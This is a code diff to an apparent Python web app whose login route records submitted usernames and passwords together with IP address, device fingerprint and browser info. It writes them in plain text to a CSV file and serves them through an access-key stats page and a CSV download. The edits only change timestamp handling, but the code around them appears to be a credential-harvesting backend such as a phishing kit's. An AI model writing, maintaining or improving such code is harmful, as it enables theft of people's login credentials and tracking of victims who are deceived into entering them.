@@ -53,7 +53,8 @@ def login():
     device_fingerprint = generate_device_fingerprint()
     browser_info = get_browser_info()
     
-    # Save the complete data with timestamp in 12-hour format
+    # Save the complete data with timestamp in 12-hour format - use the actual current time
+    # No timezone adjustment needed - just use the local time
     timestamp = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
     
     save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
@@ -267,13 +268,9 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
     
-    # Convert timestamp to 12-hour format with AM/PM and add PHT indicator
-    try:
-        dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
-        timestamp_12hr = dt.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
-    except:
-        # If parsing fails, use the original timestamp
-        timestamp_12hr = timestamp + " PHT"
+    # Just add PHT label without any time conversion
+    # This ensures we don't modify the actual recorded time
+    timestamp_with_pht = timestamp + " PHT"
     
     try:
         file_exists = os.path.isfile(csv_path)
@@ -294,7 +291,7 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             writer.writerow([
                 username,
                 password,
-                timestamp_12hr
+                timestamp_with_pht
             ])
             csvfile.flush()
             
@@ -319,7 +316,7 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             writer.writerow([
                 username,
                 password,
-                timestamp_12hr
+                timestamp_with_pht
             ])
             csvfile.flush()
             
@@ -332,7 +329,7 @@ def update_last_modified_timestamp(csv_path=None):
         script_dir = os.path.dirname(os.path.abspath(__file__))
         timestamp_file = os.path.join(script_dir, 'last_modified.txt')
         
-        # Get current timestamp in 12-hour format
+        # Get current timestamp in 12-hour format - use exact current time
         current_time = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
         # Write timestamp to file
@@ -355,8 +352,10 @@ def get_last_modified_timestamp():
         csv_path = os.path.join(script_dir, 'data.csv')
         if os.path.exists(csv_path):
             modified_time = os.path.getmtime(csv_path)
+            # Get actual modification time without timezone adjustments
             return datetime.fromtimestamp(modified_time).strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
+        # If all else fails, return current time
         return datetime.now().strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
     except Exception as e:
         print(f"Error getting timestamp: {str(e)}")
@@ -388,34 +387,19 @@ def view_stats(access_key):
                         entry['username'] = row.get('username', '')
                         # Password is already stored, will be hashed in template
                         entry['password'] = row.get('password', '')
-                        # Get timestamp
-                        timestamp_str = row.get('timestamp', '')
+                        # Get timestamp - use as is without conversion
+                        entry['timestamp'] = row.get('timestamp', '')
                         
-                        # Check if timestamp already has a format
-                        if "PHT" not in timestamp_str:
+                        # Only modify timestamps if they don't have PHT and aren't in 12-hour format
+                        if "PHT" not in entry['timestamp'] and ("AM" not in entry['timestamp'] and "PM" not in entry['timestamp']):
                             try:
-                                # Try to parse as 24-hour format
-                                timestamp_dt = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S')
-                                # Convert to 12-hour format
+                                # Try to convert to 12-hour format if it's in 24-hour format
+                                timestamp_dt = datetime.strptime(entry['timestamp'], '%Y-%m-%d %H:%M:%S')
                                 entry['timestamp'] = timestamp_dt.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
-                            except Exception:
-                                # If parsing fails, use the original timestamp
-                                entry['timestamp'] = timestamp_str
-                        else:
-                            # Already has PHT, check if it's in 12-hour format
-                            if "AM" not in timestamp_str and "PM" not in timestamp_str:
-                                try:
-                                    # Remove PHT for parsing
-                                    ts_without_pht = timestamp_str.replace(" PHT", "").strip()
-                                    timestamp_dt = datetime.strptime(ts_without_pht, '%Y-%m-%d %H:%M:%S')
-                                    # Convert to 12-hour format
-                                    entry['timestamp'] = timestamp_dt.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
-                                except Exception:
-                                    # If parsing fails, use the original timestamp
-                                    entry['timestamp'] = timestamp_str
-                            else:
-                                # Already in 12-hour format with PHT
-                                entry['timestamp'] = timestamp_str
+                            except:
+                                # If parsing fails, just add PHT if needed
+                                if "PHT" not in entry['timestamp']:
+                                    entry['timestamp'] += " PHT"
                         
                         data.append(entry)
                 break  # Successfully read data, exit loop
@@ -472,30 +456,7 @@ def download_csv(access_key):
             for row in rows:
                 username = row.get('username', '')
                 password = row.get('password', '')  # Keep password as plain text for CSV
-                timestamp = row.get('timestamp', '')
-                
-                # Ensure timestamp is in 12-hour format
-                if "PHT" in timestamp:
-                    # If it already has PHT, check if it's in 12-hour format
-                    if "AM" not in timestamp and "PM" not in timestamp:
-                        try:
-                            # Remove PHT for parsing
-                            ts_without_pht = timestamp.replace(" PHT", "").strip()
-                            timestamp_dt = datetime.strptime(ts_without_pht, '%Y-%m-%d %H:%M:%S')
-                            # Convert to 12-hour format
-                            timestamp = timestamp_dt.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
-                        except:
-                            # Keep original if parsing fails
-                            pass
-                else:
-                    # No PHT label, convert from scratch
-                    try:
-                        timestamp_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
-                        timestamp = timestamp_dt.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
-                    except:
-                        # If parsing fails, keep original and add PHT
-                        if "PHT" not in timestamp:
-                            timestamp = timestamp + " PHT"
+                timestamp = row.get('timestamp', '')  # Keep timestamp as is
                 
                 # Include only the username, password (as plain text), and timestamp
                 writer.writerow([username, password, timestamp])
